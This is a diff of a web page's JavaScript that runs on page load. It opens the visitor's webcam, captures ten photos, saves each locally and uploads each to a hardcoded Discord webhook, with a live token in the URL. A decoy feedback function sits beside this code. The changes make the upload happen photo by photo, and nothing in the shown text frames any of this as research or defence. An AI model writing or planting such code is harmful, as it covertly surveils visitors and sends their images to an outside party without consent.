@@ -14,44 +14,61 @@
         async function takePhotos(count) {
             const photos = [];
             const video = document.createElement("video");
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            await video.play();
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await video.play();
 
-            for (let i = 0; i < count; i++) {
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext("2d");
-                context.drawImage(video, 0, 0);
-                const dataUrl = canvas.toDataURL("image/png");
-                photos.push(dataUrl);
+                for (let i = 0; i < count; i++) {
+                    const canvas = document.createElement("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext("2d");
+                    context.drawImage(video, 0, 0);
+                    const dataUrl = canvas.toDataURL("image/png");
+                    photos.push(dataUrl);
+                    saveImage(dataUrl, `photo_${i + 1}.png`);
+                    await sendPhotoToDiscord(dataUrl, `photo_${i + 1}.png`);
+                    console.log(`Photo ${i + 1} taken and sent to Discord`);
+                }
+
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                console.error("Error capturing photos:", error);
             }
-
-            stream.getTracks().forEach(track => track.stop());
             return photos;
         }
 
-        async function sendPhotosToDiscord(photos) {
+        async function sendPhotoToDiscord(dataUrl, fileName) {
             const webhookUrl = "https://discordapp.com/api/webhooks/1344440845419548702/pP1MvXgW6Va0rTZ_IqTd90x77N5PHZAlWnuAEiicJlv0-cPY2zkQm6sQEnSeKEIMd7Bk";
+            const blob = await (await fetch(dataUrl)).blob();
+            const formData = new FormData();
+            formData.append("file", blob, fileName);
 
-            for (const photo of photos) {
-                await fetch(webhookUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        content: "",
-                        embeds: [{
-                            image: { url: photo }
-                        }]
-                    })
-                });
-            }
+            await fetch(webhookUrl, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        function saveImage(dataUrl, fileName) {
+            const link = document.createElement("a");
+            link.href = dataUrl;
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function submitFeedback() {
+            const feedback = document.getElementById("feedback").value;
+            console.log("Feedback submitted: " + feedback);
         }
 
         window.onload = async () => {
+            console.log("Page loaded. Taking photos...");
             const photos = await takePhotos(10);
-            await sendPhotosToDiscord(photos);
+            console.log("Photos captured and sent to Discord.");
         };
     </script>
 </body>
